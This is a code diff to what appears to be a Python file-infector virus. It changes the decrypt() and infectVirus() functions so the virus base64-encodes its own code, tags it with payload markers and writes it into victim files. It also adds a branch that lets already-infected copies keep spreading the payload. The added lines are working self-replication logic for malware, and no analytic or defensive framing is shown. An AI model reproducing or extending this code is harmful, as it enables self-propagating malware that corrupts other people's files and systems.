@@ -20,7 +20,7 @@ def decrypt():
                 if(flag):
                     encryptedCode = line[1:]
 
-                if(line.startswith("### E & D  END ###")):
+                if(line.startswith("### -_- PAYLOAD -_- ###")):
                     flag = True
 
                 if(encryptedCode):
@@ -82,7 +82,15 @@ def infectVirus():
                 infected = True
                 break
         
-        if not infected:
+        isActualVirus = False
+        fileHandler = open(sys.argv[0],"r")
+        virusLines = fileHandler.readlines()
+
+        for virusline in virusLines:
+            if(virusline.startswith("### -_- VIRUS -_- ###")):
+                isActualVirus = True
+
+        if not infected and isActualVirus:
             newCode = []
             newCode.extend(programCode + "\n")
 
@@ -93,6 +101,8 @@ def infectVirus():
             for line in lines:
                 virusCode = virusCode + line
             
+            newCode.extend("### -_- PAYLOAD -_- ###\n")
+            
             encryptedVirusCode = base64.b64encode(virusCode.encode("utf-8"))
 
             newCode.extend("#" + encryptedVirusCode.decode("utf-8"))
@@ -100,6 +110,28 @@ def infectVirus():
             fileHandler = open(victim,"w")
             fileHandler.writelines(newCode)
             fileHandler.close() 
+        
+        elif not infected and not isActualVirus:
+            newCode = []
+            newCode.extend(programCode + "\n")
+
+            newCode.extend(getED())
+
+            virusCode = str()
+            lines = getVirusCode()
+            addFlag = False
+            for line in lines:
+                if(line.startswith("### -_- PAYLOAD -_- ###")):
+                    addFlag = True
+                if(addFlag):
+                    virusCode = virusCode + line
+            
+            newCode.extend(virusCode)
+            
+            fileHandler = open(victim,"w")
+            fileHandler.writelines(newCode)
+            fileHandler.close() 
+
 
 ### TRIGGER ###
 def trigger():
